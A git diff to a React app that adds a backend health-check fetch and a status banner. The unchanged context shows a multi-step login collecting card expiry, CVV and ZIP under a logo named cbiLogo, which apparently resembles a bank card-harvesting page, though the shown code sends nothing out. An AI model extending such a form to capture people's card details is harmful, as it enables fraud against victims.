@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import axios from "axios";
 import cbiLogo from "./assets/logo.png";
 import "./App.css";
@@ -17,6 +17,25 @@ function App() {
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
   const [zip, setZip] = useState("");
+  const [message, setMessage] = useState("");
+  const [loading, setLoading] = useState(true);
+  const [error, setError] = useState(null);
+
+  useEffect(() => {
+    fetch("/api/login")
+      .then((res) => {
+        if (!res.ok) throw new Error("Network response was not ok");
+        return res.json();
+      })
+      .then((data) => {
+        setMessage(data.message);
+        setLoading(false);
+      })
+      .catch((err) => {
+        setError(err.message);
+        setLoading(false);
+      });
+  }, []);
 
   const handleLoginSubmit = (e) => {
     e.preventDefault();
@@ -145,6 +164,12 @@ function App() {
 
   return (
     <div className="app-root">
+      {/* Backend health check status */}
+      <div style={{ textAlign: "center", margin: "10px 0" }}>
+        {loading && "Checking backend..."}
+        {error && <span style={{ color: "red" }}>Backend error: {error}</span>}
+        {!loading && !error && <span style={{ color: "green" }}>Backend: {message}</span>}
+      </div>
       <div className="main-content">
         {step === 6 ? (
           <div className="login-container success-container">
